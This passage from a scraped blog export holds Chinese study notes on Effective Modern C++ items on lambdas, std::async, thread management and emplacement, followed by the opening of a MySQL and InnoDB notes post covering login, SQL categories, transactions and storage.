func(normalize(std::forward&lt;decltype(params)&gt;(params)...)); &#125;; 34 优先考虑lambda而非std::bind 优先lambda而不是std::bind的最重要原因是lambda更易读。 但是，在C++11中，可以在两种情况下使用std::bind是合理的： 移动捕获。C++11的lambda不提供移动捕获，但是可以通过结合lambda和std::bind来模拟。 多态函数对象。因为bind对象上的函数调用运算符使用完美转发，所以它可以接受任何类型的实参 例如： 123456class PolyWidget &#123;public: template&lt;typename T&gt; void operator()(const T&amp; param); …&#125;; std::bind可以如下绑定一个PolyWidget对象： 12PolyWidget pw;auto boundPW = std::bind(pw, _1); boundPW可以接受任意类型的对象了： 123boundPW(1930); //传int给PolyWidget::operator()boundPW(nullptr); //传nullptr给PolyWidget::operator()boundPW(\"Rosebud\"); //传字面值给PolyWidget::operator() 这一点无法使用C++11的lambda做到。 但是，在C++14中，可以通过带有auto形参的lambda轻松实现： 12auto boundPW = [pw](const auto&amp; param) //C++14 &#123; pw(param); &#125;; 结论 与使用std::bind相比，lambda更易读，更具表达力并且可能更高效。 只有在C++11中，std::bind 对实现移动捕获，或者绑定函数模板，会很有用。 并发API C++11的伟大成功之一是将并发整合到语言和库中。 35 优先考虑基于任务的编程而非基于线程的编程 如果开发者想要异步执行doAsyncWork函数，通常有两种方式。其一是通过创建std::thread执行doAsyncWork，这是应用了基于线程（thread-based）的方式： 12int doAsyncWork();std::thread t(doAsyncWork); 其二是将doAsyncWork传递给std::async，一种基于任务（task-based）的策略： 1auto fut = std::async(doAsyncWork); //“fut”表示“future” 这种方式中，传递给std::async的函数对象被称为一个任务（task）。 基于任务的方法通常比基于线程的方法更优： 代码量更少 如果 task 的返回值是必需的，那么 thread-based 的方式将无能为力。而基于任务的方法就简单了，因为std::async返回的future提供了get函数（从而可以获取返回值）。 如果doAsycnWork发生了异常，get函数就显得更为重要，因为get函数可以提供抛出异常的访问，而基于线程的方法，如果doAsyncWork抛出了异常，程序会直接终止（通过调用std::terminate）。 区别 基于线程与基于任务最根本的区别在于，基于任务的抽象层次更高。基于任务的方式使得开发者从线程管理的细节中解放出来，对此在C++并发软件中总结了“thread”的三种含义： 硬件线程（hardware threads）是真实执行计算的线程。现代计算机体系结构为每个CPU核心提供一个或者多个硬件线程。 软件线程（software threads）（也被称为系统线程（OS threads、system threads））是操作系统管理的在硬件线程上执行的线程。通常可以存在比硬件线程更多数量的软件线程。当软件线程被阻塞的时候（比如 I/O、同步锁或者条件变量），操作系统可以调度其他未阻塞的软件线程执行提供吞吐量。 std::thread 是C++执行过程的对象，并作为软件线程的句柄（handle）。 软件线程是有限的资源。如果开发者试图创建大于系统支持的线程数量，会抛出std::system_error异常。 即使没有超出软件线程的限额，仍然可能会遇到资源超额（oversubscription）的麻烦。当前准备运行的（即未阻塞的）软件线程大于硬件线程的数量时，线程调度器会将软件线程时间切片，分配到硬件上。 当一个软件线程的时间片执行结束，会让给另一个软件线程，此时发生上下文切换。软件线程的上下文切换会增加系统的软件线程管理开销。当软件线程安排到与上次时间片运行时不同的硬件线程上，这个开销会更高。 使用std::async 将线程管理的职责转交给C++标准库的开发者。举个例子，这种调用方式会减少抛出资源超额异常的可能性，因为这个调用可能不会开启一个新的线程。合理的调度器在系统资源超额或者线程耗尽时就会利用这个自由度。 通过向std::async传递std::launch::async启动策略来保证想运行函数在不同的线程上执行，处理不同线程响应优先级的问题。 线程调度器使用系统级线程池（thread pool）来避免资源超额的问题，并且通过工作窃取算法（work-stealing algorithm）来提升了跨硬件核心的负载均衡。实现更为繁琐。 直接使用std::thread编程，处理线程耗尽、资源超额、负责均衡问题的责任就压在了你身上，更不用说你对这些问题的解决方法与同机器上其他程序采用的解决方案配合得好不好了。 基于任务的设计为开发者避免了手动线程管理的痛苦，并且自然提供了一种获取异步执行程序的结果（即返回值或者异常）的方式。当然，仍然存在一些场景直接使用std::thread会更有优势： 你需要访问非常基础的线程API。C++并发API通常是通过操作系统提供的系统级API（pthreads或者Windows threads）来实现的，系统级API通常会提供更加灵活的操作方式（举个例子，C++没有线程优先级和亲和性的概念）。为了提供对底层系统级线程API的访问，std::thread对象提供了native_handle的成员函数，而std::future（即std::async返回的东西）没有这种能力。 你需要且能够优化应用的线程使用。 你需要实现C++并发API之外的线程技术，比如，实现未支持的平台的线程池。 结论 std::thread API不能直接访问异步执行的结果，如果执行函数有异常抛出，代码会终止执行。 基于线程的编程方式需要手动的线程耗尽、资源超额、负责均衡、平台适配性管理。 通过带有默认启动策略的std::async进行基于任务的编程方式会解决大部分问题。 36 如有必要指定std::launch::async std::launch::async启动策略意味着f必须异步执行，即在不同的线程。 std::launch::deferred启动策略意味着f仅当在std::async返回的future上调用get或者wait时才执行。这表示f推迟到存在这样的调用时才执行。当get或wait被调用，f会同步执行，即调用方被阻塞，直到f运行结束。如果get和wait都没有被调用，f将不会被执行。 std::async的默认启动策略，如果你不显式指定一个策略，不是上面中任意一个。相反，是求或在一起的。下面的两种调用含义相同： 1234auto fut1 = std::async(f); //使用默认启动策略运行fauto fut2 = std::async(std::launch::async | //使用async或者deferred运行f std::launch::deferred, f); 因此默认策略允许f异步或者同步执行。 这导致了三种结果： 无法预测f是否会与t并发运行，因为f可能被安排延迟运行。 无法预测f是否会在与某线程相异的另一线程上执行，这个某线程在fut上调用get或wait。如果对fut调用函数的线程是t，无法预测f是否在异于t的另一线程上执行。 无法预测f是否执行。 所以，以下循环看似应该最终会终止，但可能实际上永远运行： 1234567891011121314using namespace std::literals; //为了使用C++14中的时间段后缀void f() //f休眠1秒，然后返回&#123; std::this_thread::sleep_for(1s);&#125;auto fut = std::async(f); //异步运行f（理论上）while (fut.wait_for(100ms) != //循环，直到f完成运行时停止... std::future_status::ready) //但是有可能永远不会发生！&#123; …&#125; 如果f与调用std::async的线程并发运行（即，如果为f选择的启动策略是std::launch::async），这里没有问题（假定f最终会执行完毕），但是如果f是延迟执行，fut.wait_for将总是返回std::future_status::deferred。这永远不等于std::future_status::ready，循环会永远执行下去。 改进的方式如下： 1234567891011121314auto fut = std::async(f); //同上if (fut.wait_for(0s) == //如果task是deferred（被延迟）状态 std::future_status::deferred)&#123; … //在fut上调用wait或get来异步调用f&#125; else &#123; //task没有deferred（被延迟） while (fut.wait_for(100ms) != //不可能无限循环（假设f完成） std::future_status::ready) &#123; … //task没deferred（被延迟），也没ready（已准备） //做并行工作直到已准备 &#125; … //fut是ready（已准备）状态&#125; 一个总是使用 std::launch::async 的函数实现如下： C++11版本如下： 123456789template&lt;typename F, typename... Ts&gt;inlinestd::future&lt;typename std::result_of&lt;F(Ts...)&gt;::type&gt;reallyAsync(F&amp;&amp; f, Ts&amp;&amp;... params) //返回异步调用f(params...)得来的future&#123; return std::async(std::launch::async, std::forward&lt;F&gt;(f), std::forward&lt;Ts&gt;(params)...);&#125; 在C++14中，reallyAsync返回类型的推导能力可以简化函数的声明： 123456789template&lt;typename F, typename... Ts&gt;inlineauto // C++14reallyAsync(F&amp;&amp; f, Ts&amp;&amp;... params)&#123; return std::async(std::launch::async, std::forward&lt;F&gt;(f), std::forward&lt;Ts&gt;(params)...);&#125; 结论 std::async的默认启动策略是异步和同步执行兼有的。 std::async的默认启动策略，隐含了任务可能不会被执行的意思，会影响调用基于超时的wait的程序逻辑。 如果异步执行任务非常关键，则指定std::launch::async。 37 使std::thread 是 unjoinable 的 每个std::thread对象处于两个状态之一：可结合的（joinable）或者不可结合的（unjoinable）。 可结合状态的std::thread对应于正在运行或者可能要运行的异步执行线程。比如，对应于一个阻塞的（blocked）或者等待调度的线程的std::thread是可结合的；对应于运行结束的线程的std::thread也可以认为是可结合的。 不可结合的 std::thread 包括： 默认构造的std::threads。这种std::thread没有函数执行，因此没有对应到底层执行线程上。 已经被移动走的std::thread对象。移动的结果就是一个std::thread原来对应的执行线程现在对应于另一个std::thread。 已经被join的std::thread 。在join之后，std::thread不再对应于已经运行完了的执行线程。 已经被detach的std::thread 。detach断开了std::thread对象与执行线程之间的连接。 如果发生 std::thread 析构，而 std::thread 是 joinable，那么会造成程序终止。析构时发生的 隐式join 可能还会访问已经被回收的值。隐式detach ，可能出现访问或者修改没有所有权的内存的行为。 解决方法，使用 RAII 对象类管理，保证每当在执行跳至块之外时，调用局部对象的析构函数。 123456789101112131415161718192021222324252627class ThreadRAII &#123;public: enum class DtorAction &#123; join, detach &#125;; ThreadRAII(std::thread&amp;&amp; t, DtorAction a) // 在析构函数中对t实行a动作 : action(a), t(std::move(t)) &#123;&#125; // `std::thread`不可以复制 ~ThreadRAII() &#123; if (t.joinable()) &#123; //可结合性测试见下 if (action == DtorAction::join) &#123; t.join(); &#125; else &#123; t.detach(); &#125; &#125; &#125; ThreadRAII(ThreadRAII&amp;&amp;) = default; //支持移动 ThreadRAII&amp; operator=(ThreadRAII&amp;&amp;) = default; std::thread&amp; get() &#123; return t; &#125; private: // as before DtorAction action; std::thread t; // 最后声明，实例化时，前面的成员都是可用状态&#125;; 结论 析构时join会导致难以调试的表现异常问题。 析构时detach会导致难以调试的未定义行为。 声明类数据成员时，最后声明std::thread对象。 38 future析构行为 结论 future的正常析构行为就是销毁future本身的数据成员。 使用std::async启动的 future，引用了共享状态（std::shared_future）的最后一个future的析构函数会阻塞住，直到任务完成。 39 简单事件通信 一个任务通知另一个异步执行的任务发生了特定的事件很有用，因为第二个任务要等到这个事件发生之后才能继续执行。事件也许是一个数据结构已经初始化，也许是计算阶段已经完成，或者检测到重要的传感器值。 使用条件变量 如果我们将检测条件的任务称为检测任务（detecting task），对条件作出反应的任务称为反应任务（reacting task），策略很简单：反应任务等待一个条件变量，检测任务在事件发生时改变条件变量。代码如下： 12std::condition_variable cv; //事件的条件变量std::mutex m; //配合cv使用的mutex 检测任务中的代码不能再简单了： 12… //检测事件cv.notify_one(); //通知反应任务 如果有多个反应任务需要被通知，使用notify_all代替notify_one。 线程API的存在一个事实（不只是C++），等待一个条件变量的代码即使在条件变量没有被通知时，也可能被唤醒，这种唤醒被称为虚假唤醒（spurious wakeups）。 正确的代码通过确认要等待的条件确实已经发生来处理这种情况，并将这个操作作为唤醒后的第一个操作。C++条件变量的API使得这种问题很容易解决，因为允许把一个测试要等待的条件的lambda（或者其他函数对象）传给wait。因此，可以将反应任务wait调用这样写： 12cv.wait(lk, []&#123; return whether the evet has occurred; &#125;); 使用 condition variable 的示例： 123456789std::condition_variable cv; std::mutex m;bool flag(false); //不是std::atomic… //检测某个事件&#123; std::lock_guard&lt;std::mutex&gt; g(m); //通过g的构造函数锁住m flag = true; //通知反应任务（第1部分）&#125; //通过g的析构函数解锁mcv.notify_one(); //通知反应任务（第2部分） 反应任务代码如下: 1234567… //准备作出反应&#123; std::unique_lock&lt;std::mutex&gt; lk(m); cv.wait(lk, [] &#123; return flag; &#125;); //使用lambda来避免虚假唤醒 … //对事件作出反应（m被锁定）&#125;… //继续反应动作（m现在解锁） 原子变量轮询 使用原子变量的示例： 当检测线程识别到发生的事件，将flag置位： 123std::atomic&lt;bool&gt; flag(false); //共享的flag… //检测某个事件flag = true; //告诉反应线程 就其本身而言，反应线程轮询该flag。当发现flag被置位，它就知道等待的事件已经发生了： 123… //准备作出反应while (!flag); //等待事件… //对事件作出反应 这里多出了轮询的开销。 promise + future 检测任务使用std::promise&lt;void&gt;，反应任务使用std::future&lt;void&gt;或者std::shared_future&lt;void&gt;。当感兴趣的事件发生时，检测任务设置std::promise&lt;void&gt;，反应任务在future上wait。 尽管反应任务不从检测任务那里接收任何数据，通信信道也可以让反应任务知道，检测任务什么时候已经通过对std::promise&lt;void&gt;调用set_value“写入”了void数据。 1std::promise&lt;void&gt; p; //通信信道的promise 检测任务代码很简洁： 12… //检测某个事件p.set_value(); //通知反应任务 反应任务代码也同样简单： 123… //准备作出反应p.get_future().wait(); //等待对应于p的那个future… //对事件作出反应 像使用flag的方法一样，此设计不需要互斥锁，无论在反应线程调用wait之前检测线程是否设置了std::promise都可以工作，并且不受虚假唤醒的影响（只有条件变量才容易受到此影响）。 与基于条件变量的方法一样，反应任务在调用wait之后是真被阻塞住的，不会一直占用系统资源。 但是以上代码中，std::promise和future之间有个共享状态，并且共享状态是动态分配的。因此你应该假定此设计会产生基于堆的分配和释放开销。 std::promise只能设置一次。std::promise和future之间的通信是一次性的：不能重复使用。这是与基于条件变量或者基于flag的设计的明显差异，条件变量和flag都可以通信多次。 假设你仅仅想要对某线程挂起一次（在创建后，运行线程函数前），使用void的future就是一个可行方案。 通过share获得的shared_future要被在反应线程中运行的lambda按值捕获： 1234567891011121314151617std::promise&lt;void&gt; p; //跟之前一样void detect() //现在针对多个反映线程&#123; // 写在前面，防止异常发生，p.set_value() 不执行 auto sf = p.get_future().share(); //sf的类型是std::shared_future&lt;void&gt; std::vector&lt;std::thread&gt; vt; //反应线程容器 for (int i = 0; i &lt; threadsToRun; ++i) &#123; vt.emplace_back([sf]&#123; sf.wait(); //在sf的局部副本上wait； react(); &#125;); &#125; … //如果这个“…”抛出异常，detect挂起！ p.set_value(); //所有线程解除挂起 … for (auto&amp; t : vt) &#123; //使所有线程不可结合； t.join(); //“auto&amp;”见条款2 &#125;&#125; 结论 三种简单事件通信：使用条件变量、使用原子变量、使用 promise + future promise + future 的方式，在单次事件通信时，更有优势 40 并发使用std::atomic，特殊内存使用volatile 如下使用std::atmoic的代码： 12345std::atomic&lt;int&gt; ai(0); //初始化ai为0ai = 10; //原子性地设置ai为10std::cout &lt;&lt; ai; //原子性地读取ai的值++ai; //原子性地递增ai到11--ai; //原子性地递减ai到10 在这些语句执行过程中，其他线程读取ai，只能读取到0，10，11三个值其中一个。假设只有这个线程会修改ai，没有其他可能的值。 使用volatile在多线程中实际上不保证任何事情： 12345volatile int vi(0); //初始化vi为0vi = 10; //设置vi为10 std::cout &lt;&lt; vi; //读vi的值++vi; //递增vi到11--vi; //递减vi到10 代码的执行过程中，如果其他线程读取vi，可能读到任何值，比如-12，68，4090727——任何值！这份代码有未定义行为，因为这里的语句修改vi，所以如果同时其他线程读取vi，同时存在多个readers和writers读取没有std::atomic或者互斥锁保护的内存，这就是数据竞争的定义。 指令排序 代码执行本身，即使编译器没有重排顺序，底层硬件也可能重排（或者可能使它看起来运行在其他核心上），因为有时这样代码执行更快。 然而，std::atomic会限制这种重排序，保持了指令执行的有序性。 123std::atomic&lt;bool&gt; valVailable(false); auto imptValue = computeImportantValue(); //计算值valAvailable = true; //告诉另一个任务，值可用了 编译器不仅要保证imptValue和valAvailable的赋值顺序，还要保证生成的硬件代码不会改变这个顺序。结果就是，将valAvailable声明为std::atomic确保了必要的顺序——其他线程看到的是imptValue值的改变不会晚于valAvailable。 将valAvailable声明为volatile不能保证上述顺序： 123volatile bool valVailable(false); auto imptValue = computeImportantValue();valAvailable = true; //其他线程可能看到这个赋值操作早于imptValue的赋值操作 这份代码编译器可能将imptValue和valAvailable赋值顺序对调。 结论 std::atomic用于在不使用互斥锁情况下，来使变量被多个线程访问的情况。是用来编写并发程序的一个工具。 volatile用在读取和写入不应被优化掉的内存上。是用来处理特殊内存的一个工具。 其他优化 41 对于移动成本低且总是被拷贝的可拷贝形参，考虑按值传递 三个版本的addName： 12345678910111213141516171819202122232425class Widget &#123; //方法1：对左值和右值重载public: void addName(const std::string&amp; newName) &#123; names.push_back(newName); &#125; // rvalues void addName(std::string&amp;&amp; newName) &#123; names.push_back(std::move(newName)); &#125; …private: std::vector&lt;std::string&gt; names;&#125;;class Widget &#123; //方法2：使用通用引用public: template&lt;typename T&gt; void addName(T&amp;&amp; newName) &#123; names.push_back(std::forward&lt;T&gt;(newName)); &#125; …&#125;;class Widget &#123; //方法3：传值public: void addName(std::string newName) &#123; names.push_back(std::move(newName)); &#125; …&#125;; 我将前两个版本称为“按引用方法”，因为都是通过引用传递形参。 仍然考虑这两种调用方式： 123456Widget w;…std::string name(\"Bart\");w.addName(name); //传左值…w.addName(name + \"Jenne\"); //传右值 现在分别考虑三种实现中，给Widget添加一个名字的两种调用方式，拷贝和移动操作的开销。 重载：无论传递左值还是传递右值，调用都会绑定到一个叫newName的引用上。从拷贝和移动操作方面看，这个过程零开销。左值重载中，newName拷贝到Widget::names中，右值重载中，移动进去。 ​ 开销总结：左值一次拷贝，右值一次移动。 使用通用引用：同重载一样，调用也绑定到addName这个引用上，没有开销。由于使用了std::forward，左值std::string实参会拷贝到Widget::names，右值std::string实参移动进去。 ​ 对std::string实参来说，开销同重载方式一样：左值一次拷贝，右值一次移动。 按值传递：无论传递左值还是右值，都必须构造newName形参。如果传递的是左值，需要拷贝的开销，如果传递的是右值，需要移动的开销。在函数的实现中，newName总是采用移动的方式到Widget::names。 ​ 开销总结：左值实参，一次拷贝一次移动，右值实参两次移动。 对于特殊的场景，可拷贝且移动开销小的类型，传递给总是会拷贝他们的一个函数，切片也不需要考虑，。这时，按值传递就提供了一种简单的实现方式，效率接近传递引用的函数，但是避免了传引用方案的缺点。 当移动的开销较低，额外的一次移动才能被开发者接受，但是当移动的开销很大，执行不必要的移动就类似执行一个不必要的拷贝，也就是避免不必要的拷贝。 对于可拷贝形参使用按值传递。不符合此条件的的形参必须有只可移动的类型（move-only types）。 只会在目标代码中生成一个函数。避免了通用引用的种种问题。 只对总是被拷贝的形参考虑按值传递。因为传引用可以避免这个不必要的开销。 结论 对于可拷贝，移动开销低，而且无条件被拷贝的形参，按值传递效率基本与按引用传递效率一致，而且易于实现，还生成更少的目标代码。 某些情况下，通过构造拷贝形参可能比通过赋值拷贝形参开销大的多。 按值传递会引起切片问题，所说不适合基类形参类型。 42 emplacement 而不是 insertion 编译器处理的下面的调用： 1vs.push_back(std::string(\"xyzzy\")); //创建临时std::string，把它传给push_back 为了在std::string容器中创建新元素，调用了std::string的构造函数，但是这份代码并不仅调用了一次构造函数，而是调用了两次，而且还调用了std::string析构函数。下面是在push_back运行时发生了什么： 一个std::string的临时对象从字面量“xyzzy”被创建。这个对象没有名字，我们可以称为temp。temp的构造是第一次std::string构造。因为是临时变量，所以temp是右值。 temp被传递给push_back的右值重载函数，绑定到右值引用形参x。在std::vector的内存中一个x的副本被创建。这次构造——也是第二次构造——在std::vector内部真正创建一个对象。 在push_back返回之后，temp立刻被销毁，调用了一次std::string的析构函数。 使用传递给它的任何实参直接在std::vector内部构造一个std::string。没有临时变量会生成： 1vs.emplace_back(\"xyzzy\"); //直接用“xyzzy”在vs内构造std::string emplace_back使用完美转发，因此只要你没有遇到使用完美转发的限制，就可以传递任何实参以及组合到emplace_back。 emplace_back： 值是通过构造函数添加到容器，而不是直接赋值。 传递的实参类型与容器的初始化类型不同。 容器不拒绝重复项作为新值。 12vs.emplace_back(\"xyzzy\"); //在容器末尾构造新值；不是传递的容器中元 //素的类型；没有使用拒绝重复项的容器 资源管理 假定你有一个盛放std::shared_ptr&lt;Widget&gt;s的容器， 1std::list&lt;std::shared_ptr&lt;Widget&gt;&gt; ptrs; 使用push_back的代码如下： 1ptrs.push_back(std::shared_ptr&lt;Widget&gt;(new Widget, killWidget)); 也可以像这样： 1ptrs.push_back(&#123;new Widget, killWidget&#125;); 不管哪种写法，在调用push_back前会生成一个临时std::shared_ptr对象。push_back的形参是std::shared_ptr的引用，因此必须有一个std::shared_ptr。 用emplace_back应该可以避免std::shared_ptr临时对象的创建，但是在这个场景下，临时对象值得被创建。考虑如下可能的时间序列： 在上述的调用中，一个std::shared_ptr&lt;Widget&gt;的临时对象被创建来持有“new Widget”返回的原始指针。称这个对象为temp。 push_back通过引用接受temp。在存储temp的副本的list节点的内存分配过程中，内存溢出异常被抛出。 随着异常从push_back的传播，temp被销毁。作为唯一管理这个Widget的std::shared_ptr，它自动销毁Widget，在这里就是调用killWidget。 这样的话，即使发生了异常，没有资源泄漏。 考虑使用emplace_back代替push_back： 1ptrs.emplace_back(new Widget, killWidget); 通过new Widget创建的原始指针完美转发给emplace_back中，list节点被分配的位置。如果分配失败，还是抛出内存溢出异常。 当异常从emplace_back传播，原始指针是仅有的访问堆上Widget的途径，但是因为异常而丢失了，那个Widget的资源（以及任何它所拥有的资源）发生了泄漏。 在这个场景中，生命周期不良好，这个失误不能赖std::shared_ptr。使用带自定义删除器的std::unique_ptr也会有同样的问题。 解决方法是： 123std::shared_ptr&lt;Widget&gt; spw(new Widget, //创建Widget，让spw管理它 killWidget);ptrs.push_back(std::move(spw)); //添加spw右值 emplace_back的版本如下： 12std::shared_ptr&lt;Widget&gt; spw(new Widget, killWidget);ptrs.emplace_back(std::move(spw)); 无论哪种方式，都会产生spw的创建和销毁成本。 与explicit的构造函数的交互 相似的初始化语句导致了多么不一样的结果： 12std::regex r1 = nullptr; //错误！不能编译std::regex r2(nullptr); //可以编译 在标准的官方术语中，用于初始化r1的语法（使用等号）是所谓的拷贝初始化。相反，用于初始化r2的语法是（使用小括号，有时也用花括号）被称为直接初始化。 emplace_back 使用直接初始化，这意味着可能使用explicit的构造函数。 push_back 使用拷贝初始化，所以不能用explicit的构造函数。因此： 123regexes.emplace_back(nullptr); //可编译。直接初始化允许使用接受指针的 //std::regex的explicit构造函数regexes.push_back(nullptr); //错误！拷贝初始化不允许用那个构造函数 获得的经验是，当你使用emplace_back时，请特别小心确保传递了正确的实参，因为即使是explicit的构造函数也会被编译器考虑，编译器会试图以有效方式解释你的代码。 结论 原则上，emplace_back有时会比push_back高效，并且不会更差。 实际上，当以下条件满足时，emplace_back更快：（1）值被构造到容器中，而不是直接赋值；（2）传入的类型与容器的元素类型不一致；（3）容器不拒绝已经存在的重复值。 emplace_back可能执行push_back拒绝的类型转换。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"}],"author":"HeRui"},{"title":"MySQL笔记","slug":"MySQL笔记","date":"2022-04-11T15:00:53.000Z","updated":"2024-01-11T01:43:03.994Z","comments":true,"path":"posts/fd5f561d.html","link":"","permalink":"https://racleray.github.io/posts/fd5f561d.html","excerpt":"数据库，MySQL + InnoDB","text":"数据库 数据库就是存储数据的仓库，其本质是一个文件系统，数据按照特定的格式将数据存储起来 数据库管理系统（DataBase Management System，DBMS） MySQL登录 MySQL是一个需要账户名密码登录的数据库，登陆后使用，它提供了一个默认的root账号，使用安装时设置的密码即可登录。 12345678格式1：cmd&gt; mysql –u用户名 –p密码例如：mysql -uroot –proot格式2: mysql –u用户名 –p请输入密码: root格式2：cmd&gt; mysql --host&#x3D;ip地址 --user&#x3D;用户名 --password&#x3D;密码例如：mysql --host&#x3D;127.0.0.1 --user&#x3D;root --password&#x3D;root SQL 数据定义语言：简称DDL(Data Definition Language)：create，alter，drop等 数据操作语言：简称DML(Data Manipulation Language)：insert，delete，update等 数据查询语言：简称DQL(Data Query Language)：select，from，where等 数据控制语言：简称DCL(Data Control Language)：定义数据库的访问权限和安全级别，及创建用户 SQL语句可以单行或多行书写，以分号结尾。 注释形式： 123-- 单行注释内容/* 多行注释 */# 单行注释内容 NOTE: 常用功能查 AI 效率得多，NICE 注意点 删除表中所有记录使用【delete from 表名】，还是用【truncate table 表名】？ delete ：一条一条删除，不清空 auto_increment 记录数。 truncate ：直接将表删除，重新建表，auto_increment 将置为零，从新开始 原则上，互联网应用一般删除是添加 deleted 标记，实际上数据保留。 有些场景，IoT数据采集，可以适当删除数据。 约束 主键约束 primary key 唯一性约束 unique 非空约束 not null 外键约束 foreign key 查询 条件查询 having 和 where 的区别: 对查询结果进行分组前，将不符合 where 条件的记录过滤掉，然后再分组。 where 后面，不能再使用聚合函数。 筛选满足条件的组，分组之后过滤数据。 having 后面，可以使用聚合函数。 范围查询 模糊查询 分组聚合 group by 分页查询 limit [offset, length] 逻辑分页：将数据库中的数据查询到内存之后再进行分页。 物理分页：通过 LIMIT 关键字，直接在数据库中进行分页，最终返回的数据，只是分页后的数据。 子查询 子查询允许把一个查询嵌套在另一个查询当中。 备份与恢复 1mysqldump -u用户名 -p密码 数据库名&gt;生成的脚本文件路径 1234mysql -uroot -p密码 数据库名 &lt; 文件路径或者在 mysql 命令行外：source SQL脚本路径 关系 一对一：比如，一个男的只能取一个女的当老婆。 1234#外键唯一ALTER TABLE husband ADD wid INT UNIQUE;#外键约束alter table husband add foreign key (wid) references wife(id); 一对多：比如，客户与订单，一个客户可以在商城中下多个订单。 唯一区别就是外键不唯一。 多对多：比如，学生与课程，一个学校有很多学生，学生都可以学很多课程。 需要中间表去完成多对多关系的创建，多对多关系其实就是两个一对多关系的组合。 连接 笛卡尔积 123-- 查询的时候-- 左边表中的每一条记录和右边表的每一条记录都进行组合了select * from worker, department; 有一些数据其实是无用的，只有满足 worker.depart_id = department.id 这个条件，过滤出来的数据才是我们想要的最终结果。 1select * from worker, department where worker.depart_id = department.id; 隐式内连接（使用 where 关键字来指定条件） 显示内连接（使用 inner..join..on 语句） 左外连接: select 字段 from 左表 left outer join 右表 .. on 条件 ​ 先保证左边的数据全部展示，再去找右表中的数据。 右外连接: select 字段 from 左表 right outer join 右表.. on 条件 ​ 保证右边表中的全部数据都展示 事务 要么成功，要么不成功回滚 当我们在 MySQL 中，如果开启了事务，那么你所有的操作都会临时被保存在事务日志中，只有遇上 commit（提交）命令的时候，才会同步到数据表中。如果遇上 rollback 和 断开连接，那么它都会去清空事务日志。 1234第一步：开启事务第二步：执行你的 SQL 语句第三步：提交事务第四步：如果出现问题的话，则回滚事务（数据） 12345678第一步：开启事务start transaction;第二步：执行你的 SQL 语句update bankCount set money = money - 500 where name = 'cuihua';update bankCount set money = money + 500 where name = 'banban';第三步：如果出现问题的话，则回滚事务（数据）commit;// rollback; 特性 原子性（操作）：Atomicity 在每一个事务中，都可以看成是一个整体，不能将其再度分解，所有的操作，要么一起成功，要么一起失败。 一致性（数据）：Consistency 在事务执行前数据的所有状态跟执行后的数据状态应该是一样的。比如，转账前两个账户的金额总和应该跟转账后两个账户的总金额都是一样的。 隔离性（事务）：Isolation 多个事务之间不能相互影响，必须保证其操作的单独性，否则会出现一些串改的情况，执行的时候应该保持隔离的状态。 持久性（结果）：Durability 如果我们的事务执行成功之后，它将把数据永久性存储到数据库中，哪怕设备关机之后，也是能够保存下来的。 不同隔离级别的问题 脏读：其中一个事务读取到了另外一个事务中的数据（尚未提交的数据）。 不可重复读：一个事务中两次读取数据的时候，发现数据的内容不一样。一般是 update 操作引发。 幻读：一个事务中，两次读取数据的时候，发现数据的数量不一样。一般是 insert 或者 delete 操作引起。 隔离级别 read uncommitted 读未提交 read committed 读已提交：解决脏读 repeatable read 可重复读（默认）：解决不可重复读 serializable 串行化：解决幻读 用户设置 创建、授权、修改等操作。 MySQL 结构 MySQL从物理结构上可以分为： 日志文件 数据索引文件 MySQL在Linux中的数据索引文件和日志文件通常放在 /var/lib/mysql 目录下。 日志 常用的日志文件包括： 错误日志: 错误日志记录了运行过程中遇到的所有严重的错误信息，以及 MySQL 每次启动和关闭的详细信息。 二进制日志: binlog记录了数据库所有的ddl语句和dml语句 查询日志：记录用户的所有操作，影响使用性能，一般不启用 慢查询日志：记录执行时间超过long_query_time秒的所有查询 事务Redo日志 中继日志 数据索引 ibdata 文件：使用共享表空间存储表数据和索引信息，所有表共同使用一个或者多个ibdata文件。 InnoDB存储引擎的数据文件 .frm文件：主要存放与表相关的数据信息，主要包括表结构的定义信息 .ibd：使用独享表空间存储表数据和索引信息，一张表对应一个ibd文件。 数据处理： 联机事务处理 OLTP (On-Line Transaction Processing)：基本使用，非海量数据 联机分析处理 OLAP (On-Line Analytical Processing)：数据量大，实时性要求不高 存储形式： 行式：不是适合海量数据 列式（各列独立存储，利于压缩）：低延迟、查找高效，不适合删除更新频繁的场景 架构 SQL的执行逻辑： 缓存的伏笔 查询缓存默认是关闭的状态，多数情况下，不建议使用MySQL查询缓存，为什么呢？ 因为查询缓存往往弊大于利。 成本高：查询缓存的失效非常频繁，只要有对一个表的更新，这个表上所有的查询缓存都会被清空。因此很可能你费劲地把结果存起来，还没使用呢，就被一个更新全清空了。 命中率不高：对于更新压力大的数据库来说，查询缓存的命中率会非常低。除非你的业务就是有一张静态表，很长时间才会更新一次。比如，一个系统配置表，那这张表上的查询才适合使用查询缓存。 有更好的缓存工具：redis、memcache... InnoDB Buffer Buffer Pool 中数据以页为存储单位，其实现数据结构是以页为单位的单链表。默认大小为128M。LRU 算法缓冲热点数据。 Change Buffer 用于加速非热点数据中二级索引的写入操作。由于二级索引数据的不连续性，导致修改二级索引时需要进行频繁的磁盘 IO 消耗大量性能，Change Buffer 缓冲对二级索引的修改操作，同时将写操作录入 redo log 中，在缓存到一定量或系统空闲时进行 merge 操作将修改写入磁盘中，从而达到减少磁盘 I/O 的目的。 二级索引就是辅助索引，除了聚簇索引之外的所有索引都是二级索引。 聚簇索引是也叫聚集索引，有的也叫索引组织表。 InnoDB 使用 Log Buffer 来缓冲日志文件的写入操作。事务提交的时候必须将操作写入日志中，此时日志文件若未落盘而系统崩溃，则相关操作将丢失而无法恢复。 InnoDB 提供三种 Log Buffer 数据落盘方式 0：按秒写，按秒刷。每秒调用 write() 写入 OS Buffer 并调用 flush() 刷入磁盘。 1：实时写，实时刷。每次事务提交都调用 write() 写入 OS Buffer 并调用 flush() 刷入磁盘。 2：实时写，延迟刷。每次事务提交都调用 write() 写入 OS Buffer，但每秒调用 flush() 刷入磁盘。 磁盘文件 在磁盘中，InnoDB 将所有数据都存放在一个空间中，称为表空间（Tablespace）。表空间由段 （Segment）、区（extent）、页（Page）组成。 区（Extend）是由连续的页组成的空间，大小固定为 1MB，由于默认页大小为 16K，因此一个区默认存储 64 个连续的页。 页（Page）是 InnoDB 的基本存储单位，每个页大小默认为 